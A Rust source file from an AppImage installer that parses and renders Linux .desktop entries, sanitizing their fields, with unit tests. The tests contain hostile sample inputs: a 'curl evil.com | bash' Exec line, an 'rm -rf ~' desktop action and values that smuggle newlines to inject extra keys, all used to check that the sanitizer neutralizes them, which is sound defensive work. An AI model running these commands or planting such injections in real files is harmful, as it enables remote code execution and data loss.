use std::fmt::Write as _;
use std::path::Path;

use crate::domain::error::DomainError;
use crate::domain::models::{DesktopFieldCode, ExtractedMetadata};
use crate::domain::sanitizer::{
    escape_desktop_exec_path, escape_desktop_list_item, escape_desktop_value,
    sanitize_single_line_value,
};

const MAX_NAME_CHARS: usize = 256;
const MAX_COMMENT_CHARS: usize = 512;
const SPECIFIC_MAIN_CATEGORIES: &[&str] = &[
    "AudioVideo",
    "Development",
    "Education",
    "Game",
    "Graphics",
    "Network",
    "Office",
    "Science",
    "Settings",
    "System",
];

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ParsedDesktopEntry {
    pub app_name: Option<String>,
    pub generic_name: Option<String>,
    pub comment: Option<String>,
    pub icon: Option<String>,
    pub categories: Vec<String>,
    pub mime_types: Vec<String>,
    pub keywords: Vec<String>,
    pub startup_wm_class: Option<String>,
    pub terminal: bool,
    pub startup_notify: Option<bool>,
    pub no_display: bool,
    pub appimage_version: Option<String>,
    pub exec_field_code: Option<DesktopFieldCode>,
}

pub fn parse_desktop_entry(raw: &str) -> Result<ParsedDesktopEntry, DomainError> {
    let cleaned_bom = raw.trim_start_matches('\u{FEFF}');
    let mut parsed = ParsedDesktopEntry::default();
    let mut in_desktop_entry = false;
    let mut found_desktop_entry = false;
    let mut entry_type: Option<String> = None;

    for raw_line in cleaned_bom.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if line.starts_with('[') && line.ends_with(']') {
            if line == "[Desktop Entry]" {
                if found_desktop_entry {
                    return Err(DomainError::InvalidDesktopEntry(
                        "duplicate [Desktop Entry] section".to_string(),
                    ));
                }
                found_desktop_entry = true;
                in_desktop_entry = true;
            } else {
                in_desktop_entry = false;
            }
            continue;
        }
        if !in_desktop_entry {
            continue;
        }

        let Some((key_raw, val_raw)) = line.split_once('=') else {
            continue;
        };
        let key = key_raw.trim();
        if key.contains('[') {
            continue;
        }

        let val_trimmed = val_raw.trim_start();
        match key {
            "Categories" => {
                parsed.categories = sanitize_category_list(val_trimmed);
                continue;
            }
            "MimeType" => {
                parsed.mime_types = sanitize_mime_list(val_trimmed);
                continue;
            }
            "Keywords" => {
                parsed.keywords = sanitize_keyword_list(val_trimmed);
                continue;
            }
            _ => {}
        }

        let unescaped = unescape_desktop_string(val_trimmed);
        let clean_val = sanitize_single_line_value(&unescaped);

        match key {
            "Type" => entry_type = Some(clean_val),
            "Name" if !clean_val.is_empty() => {
                parsed.app_name = Some(truncate_chars(&clean_val, MAX_NAME_CHARS));
            }
            "GenericName" if !clean_val.is_empty() => {
                parsed.generic_name = Some(truncate_chars(&clean_val, MAX_NAME_CHARS));
            }
            "Comment" if !clean_val.is_empty() => {
                parsed.comment = Some(truncate_chars(&clean_val, MAX_COMMENT_CHARS));
            }
            "Icon" if !clean_val.is_empty() => {
                parsed.icon = Some(truncate_chars(&clean_val, MAX_NAME_CHARS));
            }
            "StartupWMClass" if !clean_val.is_empty() => {
                parsed.startup_wm_class = Some(truncate_chars(&clean_val, MAX_NAME_CHARS));
            }
            "Terminal" => {
                parsed.terminal = clean_val.eq_ignore_ascii_case("true");
            }
            "StartupNotify" => {
                if clean_val.eq_ignore_ascii_case("true") {
                    parsed.startup_notify = Some(true);
                } else if clean_val.eq_ignore_ascii_case("false") {
                    parsed.startup_notify = Some(false);
                }
            }
            "NoDisplay" => {
                parsed.no_display = clean_val.eq_ignore_ascii_case("true");
            }
            "X-AppImage-Version" if !clean_val.is_empty() => {
                parsed.appimage_version = Some(truncate_chars(&clean_val, 64));
            }
            "Exec" => {
                parsed.exec_field_code = extract_allowlisted_field_code(&clean_val);
            }
            _ => {}
        }
    }

    if !found_desktop_entry {
        return Err(DomainError::InvalidDesktopEntry(
            "missing [Desktop Entry] header".to_string(),
        ));
    }

    match entry_type.as_deref() {
        Some("Application") => {}
        Some(ty) => {
            return Err(DomainError::InvalidDesktopEntry(format!(
                "unsupported desktop Type='{ty}' (expected 'Application')"
            )));
        }
        None => {
            return Err(DomainError::InvalidDesktopEntry(
                "missing mandatory Type=Application key".to_string(),
            ));
        }
    }

    Ok(parsed)
}

pub fn render_desktop_entry(
    metadata: &ExtractedMetadata,
    exec_path: &Path,
    icon_name_or_fallback: &str,
) -> Result<String, DomainError> {
    let raw_exec = exec_path
        .to_str()
        .ok_or_else(|| DomainError::InvalidDesktopEntry("non-UTF-8 Exec path".to_string()))?;
    let escaped_exec =
        escape_desktop_exec_path(raw_exec).map_err(DomainError::InvalidDesktopEntry)?;
    let clean_name = sanitize_single_line_value(&metadata.app_name);
    if clean_name.is_empty() {
        return Err(DomainError::InvalidDesktopEntry(
            "application display name cannot be empty".to_string(),
        ));
    }
    let clean_icon = sanitize_single_line_value(icon_name_or_fallback);
    if clean_icon.is_empty() {
        return Err(DomainError::InvalidDesktopEntry(
            "icon field cannot be empty".to_string(),
        ));
    }

    let mut out = String::with_capacity(512);
    out.push_str("[Desktop Entry]\n");
    out.push_str("Type=Application\n");
    let _ = writeln!(out, "Name={}", escape_desktop_value(&clean_name));
    if let Some(ref generic) = metadata.generic_name {
        let clean = sanitize_single_line_value(generic);
        if !clean.is_empty() {
            let _ = writeln!(out, "GenericName={}", escape_desktop_value(&clean));
        }
    }
    if let Some(ref comment) = metadata.comment {
        let clean = sanitize_single_line_value(comment);
        if !clean.is_empty() {
            let _ = writeln!(out, "Comment={}", escape_desktop_value(&clean));
        }
    }

    if let Some(field_code) = metadata.exec_field_code {
        let _ = writeln!(out, "Exec={} {}", escaped_exec, field_code.as_str());
    } else {
        let _ = writeln!(out, "Exec={escaped_exec}");
    }

    let _ = writeln!(out, "Icon={}", escape_desktop_value(&clean_icon));
    let _ = writeln!(
        out,
        "Terminal={}",
        if metadata.terminal { "true" } else { "false" }
    );

    let normalized_categories = normalize_desktop_categories(&metadata.categories);
    if !normalized_categories.is_empty() {
        let escaped: Vec<String> = normalized_categories
            .iter()
            .map(|c| escape_desktop_list_item(c))
            .collect();
        let _ = writeln!(out, "Categories={};", escaped.join(";"));
    }
    let clean_mimes: Vec<String> = metadata
        .mime_types
        .iter()
        .map(|m| sanitize_single_line_value(m))
        .filter(|m| !m.is_empty())
        .map(|m| escape_desktop_list_item(&m))
        .collect();
    if !clean_mimes.is_empty() {
        let _ = writeln!(out, "MimeType={};", clean_mimes.join(";"));
    }
    let clean_keywords: Vec<String> = metadata
        .keywords
        .iter()
        .map(|k| sanitize_single_line_value(k))
        .filter(|k| !k.is_empty())
        .map(|k| escape_desktop_list_item(&k))
        .collect();
    if !clean_keywords.is_empty() {
        let _ = writeln!(out, "Keywords={};", clean_keywords.join(";"));
    }
    if let Some(ref wm_class) = metadata.startup_wm_class {
        let clean = sanitize_single_line_value(wm_class);
        if !clean.is_empty() {
            let _ = writeln!(out, "StartupWMClass={}", escape_desktop_value(&clean));
        }
    }
    if let Some(notify) = metadata.startup_notify {
        let _ = writeln!(out, "StartupNotify={notify}");
    }
    if let Some(ref version) = metadata.version {
        let clean = sanitize_single_line_value(version);
        if !clean.is_empty() {
            let _ = writeln!(out, "X-AppImage-Version={}", escape_desktop_value(&clean));
        }
    }
    out.push_str("X-AppImage-Managed-By=install-appimage\n");

    Ok(out)
}

fn extract_allowlisted_field_code(exec_value: &str) -> Option<DesktopFieldCode> {
    for token in exec_value.split_whitespace() {
        let clean = token.trim_matches(|ch: char| ch == '\x22' || ch == '\x27');
        match clean {
            "%f" => return Some(DesktopFieldCode::LowerF),
            "%F" => return Some(DesktopFieldCode::UpperF),
            "%u" => return Some(DesktopFieldCode::LowerU),
            "%U" => return Some(DesktopFieldCode::UpperU),
            _ => {}
        }
    }
    None
}

fn split_desktop_list_unescaped(raw: &str) -> Vec<String> {
    let mut items = Vec::new();
    let mut current = String::new();
    let mut chars = raw.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch == '\\' {
            match chars.next() {
                Some(';') => current.push(';'),
                Some('s') => current.push(' '),
                Some('n') => current.push(' '),
                Some('t') => current.push(' '),
                Some('r') => {}
                Some('\\') => current.push('\\'),
                Some(other) => current.push(other),
                None => {}
            }
        } else if ch == ';' {
            items.push(std::mem::take(&mut current));
        } else {
            current.push(ch);
        }
    }
    if !current.is_empty() {
        items.push(current);
    }
    items
}

fn sanitize_category_list(raw: &str) -> Vec<String> {
    let mut out = Vec::new();
    for item in split_desktop_list_unescaped(raw) {
        let clean = sanitize_single_line_value(&item);
        if !clean.is_empty()
            && clean
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
            && !out.iter().any(|existing| existing == &clean)
        {
            out.push(clean);
        }
    }
    normalize_desktop_categories(&out)
}

pub fn normalize_desktop_categories(categories: &[String]) -> Vec<String> {
    let mut normalized = Vec::with_capacity(categories.len() + 1);
    for raw in categories {
        let clean = sanitize_single_line_value(raw);
        if !clean.is_empty()
            && clean
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
            && !normalized.iter().any(|existing| existing == &clean)
        {
            normalized.push(clean);
        }
    }

    let has_audio_or_video = normalized.iter().any(|c| c == "Audio" || c == "Video");
    let has_audiovideo = normalized.iter().any(|c| c == "AudioVideo");
    if has_audio_or_video && !has_audiovideo {
        let insert_idx = normalized
            .iter()
            .position(|c| c == "Audio" || c == "Video")
            .unwrap_or(0);
        normalized.insert(insert_idx, "AudioVideo".to_string());
    }

    let has_specific_main = normalized
        .iter()
        .any(|c| SPECIFIC_MAIN_CATEGORIES.contains(&c.as_str()));
    if has_specific_main {
        normalized.retain(|c| c != "Utility");
    }

    normalized
}

fn sanitize_mime_list(raw: &str) -> Vec<String> {
    let mut out = Vec::new();
    for item in split_desktop_list_unescaped(raw) {
        let clean = sanitize_single_line_value(&item);
        let Some((left, right)) = clean.split_once('/') else {
            continue;
        };
        if !left.is_empty()
            && !right.is_empty()
            && !right.contains('/')
            && is_valid_mime_part(left)
            && is_valid_mime_part(right)
            && !out.iter().any(|existing| existing == &clean)
        {
            out.push(clean);
        }
    }
    out
}

fn is_valid_mime_part(part: &str) -> bool {
    part.bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'+' | b'-' | b'_'))
}

fn sanitize_keyword_list(raw: &str) -> Vec<String> {
    let mut out = Vec::new();
    for item in split_desktop_list_unescaped(raw) {
        let clean = sanitize_single_line_value(&item);
        if !clean.is_empty() && !out.iter().any(|existing| existing == &clean) {
            out.push(clean);
        }
    }
    out
}

fn unescape_desktop_string(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    let mut chars = raw.chars();
    while let Some(ch) = chars.next() {
        if ch == '\\' {
            match chars.next() {
                Some('s') => out.push(' '),
                Some('n') => out.push(' '),
                Some('t') => out.push(' '),
                Some('r') => {}
                Some('\\') => out.push('\\'),
                Some(';') => out.push(';'),
                Some(other) => out.push(other),
                None => {}
            }
        } else {
            out.push(ch);
        }
    }
    out
}

fn truncate_chars(raw: &str, max: usize) -> String {
    raw.chars().take(max).collect()
}

#[cfg(test)]
mod tests {
    use std::path::Path;

    use crate::domain::models::{DesktopFieldCode, ExtractedMetadata};

    use super::{normalize_desktop_categories, parse_desktop_entry, render_desktop_entry};

    #[test]
    fn rejects_missing_header_missing_type_duplicate_section_or_non_application() {
        assert!(parse_desktop_entry("Name=Broken\nExec=foo").is_err());
        assert!(parse_desktop_entry("[Desktop Entry]\nName=NoType\nExec=foo").is_err());
        assert!(
            parse_desktop_entry("[Desktop Entry]\nType=Link\nURL=https://example.com").is_err()
        );
        assert!(
            parse_desktop_entry(
                "[Desktop Entry]\nType=Application\nName=One\n[Desktop Entry]\nType=Application\nName=Two\n"
            )
            .is_err()
        );
    }

    #[test]
    fn neutralizes_exec_injection_escapes_keywords_and_ignores_desktop_actions() {
        let raw = "\u{FEFF}[Desktop Entry]\n\
            Type=Application\n\
            Name=Evil\x1b[31mApp\u{202E}\n\
            Exec=sh -c \"curl evil.com | bash\" --no-sandbox %U\n\
            Path=/tmp/evil\n\
            DBusActivatable=true\n\
            Categories=Utility;Office;bad$cat;\n\
            MimeType=text/plain;bad/mime/type;x-scheme-handler/obsidian;\n\
            Keywords=foo\\\\bar;semi\\;col;\n\
            X-AppImage-Version=1.7.4\n\
            [Desktop Action Evil]\n\
            Name=Backdoor\n\
            Exec=rm -rf ~\n";

        let parsed = parse_desktop_entry(raw).unwrap();
        assert_eq!(parsed.app_name.as_deref(), Some("EvilApp"));
        assert_eq!(parsed.exec_field_code, Some(DesktopFieldCode::UpperU));
        assert_eq!(parsed.categories, vec!["Office"]);
        assert_eq!(
            parsed.mime_types,
            vec!["text/plain", "x-scheme-handler/obsidian"]
        );
        assert_eq!(parsed.keywords, vec!["foo\\bar", "semi;col"]);
        assert_eq!(parsed.appimage_version.as_deref(), Some("1.7.4"));

        let meta = ExtractedMetadata {
            app_name: parsed.app_name.unwrap(),
            version: parsed.appimage_version,
            generic_name: parsed.generic_name,
            comment: parsed.comment,
            icon_key: None,
            categories: parsed.categories,
            mime_types: parsed.mime_types,
            keywords: parsed.keywords,
            startup_wm_class: parsed.startup_wm_class,
            terminal: parsed.terminal,
            startup_notify: parsed.startup_notify,
            exec_field_code: parsed.exec_field_code,
            icons: Vec::new(),
        };

        let rendered = render_desktop_entry(
            &meta,
            Path::new("/home/user/Applications/evilapp.AppImage"),
            "evilapp",
        )
        .unwrap();

        assert!(rendered.contains("Exec=/home/user/Applications/evilapp.AppImage %U\n"));
        assert!(rendered.contains("Keywords=foo\\\\bar;semi\\;col;\n"));
        assert!(!rendered.contains("curl"));
        assert!(!rendered.contains("Backdoor"));
        assert!(!rendered.contains("DBusActivatable"));
        assert!(!rendered.contains("Path=/tmp"));
    }

    #[test]
    fn preserves_only_first_valid_field_code_or_none() {
        let raw = "[Desktop Entry]\nType=Application\nName=Tool\nExec=AppRun --flag %k %f %U\n";
        let parsed = parse_desktop_entry(raw).unwrap();
        assert_eq!(parsed.exec_field_code, Some(DesktopFieldCode::LowerF));

        let no_code = parse_desktop_entry(
            "[Desktop Entry]\nType=Application\nName=Tool\nExec=AppRun --flag\n",
        )
        .unwrap();
        assert_eq!(no_code.exec_field_code, None);
    }

    #[test]
    fn normalizes_and_deduplicates_desktop_categories_per_freedesktop_spec() {
        assert_eq!(normalize_desktop_categories(&[]), Vec::<String>::new());

        assert_eq!(
            normalize_desktop_categories(&["Utility".to_string()]),
            vec!["Utility"]
        );

        assert_eq!(
            normalize_desktop_categories(&["Utility".to_string(), "GTK".to_string()]),
            vec!["Utility", "GTK"]
        );

        assert_eq!(
            normalize_desktop_categories(&[
                "Network".to_string(),
                "Utility".to_string(),
                "Network".to_string(),
                "WebBrowser".to_string(),
            ]),
            vec!["Network", "WebBrowser"]
        );

        assert_eq!(
            normalize_desktop_categories(&["Utility".to_string(), "Audio".to_string()]),
            vec!["AudioVideo", "Audio"]
        );

        assert_eq!(
            normalize_desktop_categories(&[
                "Video".to_string(),
                "Audio".to_string(),
                "Video".to_string(),
            ]),
            vec!["AudioVideo", "Video", "Audio"]
        );

        assert_eq!(
            normalize_desktop_categories(&["AudioVideo".to_string(), "Audio".to_string()]),
            vec!["AudioVideo", "Audio"]
        );

        let parsed = parse_desktop_entry(
            "[Desktop Entry]\nType=Application\nName=Player\nExec=AppRun\nCategories=Utility;Video;Player;Utility;\n",
        )
        .unwrap();
        assert_eq!(parsed.categories, vec!["AudioVideo", "Video", "Player"]);
    }

    #[test]
    fn sanitizes_direct_mime_types_and_keywords_in_render_desktop_entry() {
        let meta = ExtractedMetadata {
            app_name: "SafeRender".to_string(),
            version: None,
            generic_name: None,
            comment: None,
            icon_key: None,
            categories: vec![],
            mime_types: vec![
                "text/plain\nExec=evil".to_string(),
                "\x1b[31m\u{202E}".to_string(),
            ],
            keywords: vec![
                "alpha\r\n[Desktop Action Pwn]".to_string(),
                "a;b".to_string(),
            ],
            startup_wm_class: None,
            terminal: false,
            startup_notify: None,
            exec_field_code: None,
            icons: Vec::new(),
        };

        let rendered = render_desktop_entry(
            &meta,
            Path::new("/home/user/Applications/saferender.AppImage"),
            "saferender",
        )
        .unwrap();
        assert!(rendered.contains("MimeType=text/plain Exec=evil;\n"));
        assert!(rendered.contains("Keywords=alpha [Desktop Action Pwn];a\\;b;\n"));
        assert!(!rendered.contains("\nExec=evil"));
        assert!(!rendered.contains("\n[Desktop Action Pwn]"));
    }
}
